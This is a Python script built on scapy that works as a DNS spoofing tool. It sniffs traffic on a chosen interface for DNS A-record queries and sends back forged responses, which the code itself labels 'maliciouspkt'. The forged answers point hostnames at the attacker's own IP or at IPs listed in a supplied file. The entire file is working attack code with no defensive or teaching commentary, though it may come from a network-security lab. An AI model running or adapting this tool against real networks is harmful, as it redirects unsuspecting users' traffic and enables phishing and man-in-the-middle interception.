from scapy.all import *
import getopt
from subprocess import check_output

# get_myip()
# returns the ip of the local machine (eth0)/(ifconfig IP)
#
def get_myip():
	return check_output(['hostname', '--all-ip-addresses']).decode("UTF-8")

# readFromFile(filename) - filename: file to read from
# returns the lines read from the file
#
def readFromFile(filename):
	print("filename: " + filename)
	f = open(filename, "r")
	return f.readlines()

# spoofer2(pkt) - pkt: packet
# Checks to see if the DNS Hostname query is in the file with 
# "IP Hostname" 
# calls sniffer if a match is found
def spoofer2(pkt):
	if pkt.haslayer(DNSQR):
		for line in lines:
			y = 0
			count = 0
			for x in pkt[DNSQR].qname.decode("UTF-8").split('.')[:-1]:
				if len(line.split()[1].split('.')) > y:
					if line.split()[1].split('.')[y] == x:
						count += 1
				y+=1
				
			if count == y:
				global responseIP
				responseIP = line.split()[0]
				spoofer(pkt)
				return

# spoofer(packet2) - packet2: packet to be analyzed
# Checks to see if DNSQR layer. If true then create a malicious packet
# and send packet to source port
# 
def spoofer(packet2):
	if packet2.haslayer(DNSQR):
		if(packet2[DNS].qr == 0 and packet2[DNSQR].qtype == 1):
		 	maliciouspkt = Ether(dst=packet2[Ether].src, src=packet2[Ether].dst, type=packet2[Ether].type)/\
		 		IP(dst=packet2[IP].src, src=packet2[IP].dst) /\
		 		UDP(dport=packet2[UDP].sport, sport=packet2[UDP].dport) /\
		 		DNS(id=packet2[DNS].id, qr=1, aa=1, qd=packet2[DNS].qd, qdcount=1,ancount=1,\
		 			an=DNSRR(rrname=packet2[DNS].qd.qname, ttl=2000, rdata=responseIP, type=1))
		 	sendp(maliciouspkt)

if __name__== "__main__":
	argumentList = sys.argv[1:]
	responseIP = ""
	options = "i:f:"
	fflag = 0
	iflag = 0
	interface = ""
	expression = ""


	try: 
	    # Parsing argument 
	    arguments, values = getopt.getopt(argumentList, options) 

	    if len(argumentList)%2 == 1:
	        expression = argumentList[-1]
	      
	    # checking each argument 
	    for currentArgument, currentValue in arguments: 
	  
	        if currentArgument in ("-f"): 
	            fflag = 1
	            lines = readFromFile(currentValue)
	            
	        if currentArgument in ("-i"): 
	            iflag = 1
	            interface = currentValue
	            print("interface: " + interface)
	            if not (interface == "lo" or interface == "eth0"):
	                print("'" + interface + "' interface not available. Choose from: [eth0, lo]")
	                exit()
	              
	except (getopt.error, OSError) as err: 
	    # output error, and return with an error code 
	    print(str(err))
	    exit()

	print("Sniffing...")
	if iflag == 1:
		if fflag == 0: # FFLAG is 0 and IFLAG is 1
			if expression == "":
				# USE LOCAL MACHINE IP AS RESPONSE IP
				responseIP = get_myip()
				sniff(prn=spoofer, count=0, iface=interface)
			else:
				print("BPF Filter:%s"%(expression))
				try:
					sniff(prn=spoofer, count=0, iface=interface, filter=expression)
				except:
					print("Error with BPF Filter. Exiting")
					exit()
		else: # FFLAG is 1 and IFLAG is 1
			if expression == "":
				for line in lines: # check to make sure every line has IP/Hostname
					if len(line.split()) != 2:
						print("A single line in the hostnames file does not contain 2 entries; [IP] [hostname]")
						exit()
				sniff(prn=spoofer2, count=0, iface=interface)
			else: 
				for line in lines: # check to make sure every line has IP/Hostname
					if len(line.split()) != 2:
						print("A single line in the hostnames file does not contain 2 entries; [IP] [hostname]")
						exit()
				try:
					sniff(prn=spoofer2, count=0, iface=interface, filter=expression)
				except:
					print("Error with BPF Filter. Exiting")
					exit()

	if fflag == 0: # FFLAG and IFLAG are both 0 
		if expression == "":
			# print("MYIP: %s" %(get_myip().decode("UTF-8")));
			responseIP = get_myip()
			sniff(prn=spoofer, count=0)
		else:
			responseIP = get_myip()
			try:
				sniff(prn=spoofer, count=0, filter=expression)
			except:
				print("Error with BPF Filter. Exiting")
				exit()
	else: # FFLAG is 1 and IFLAG is 0
		if expression == "":
		# print("in here")
			for line in lines: # check to make sure that every line has IP/Hostname
				if len(line.split()) != 2:
					print("A single line in the hostnames file does not contain 2 entries; [IP] [hostname]")
					exit()
			sniff(prn=spoofer2, count=0)
		else:
			for line in lines: # check to make sure that every line has IP/Hostname
				if len(line.split()) != 2:
					print("A single line in the hostnames file does not contain 2 entries; [IP] [hostname]")
					exit()
			try:
				sniff(prn=spoofer2, count=0, filter=expression)

			except:
				print("Error with BPF Filter. Exiting")
				exit()



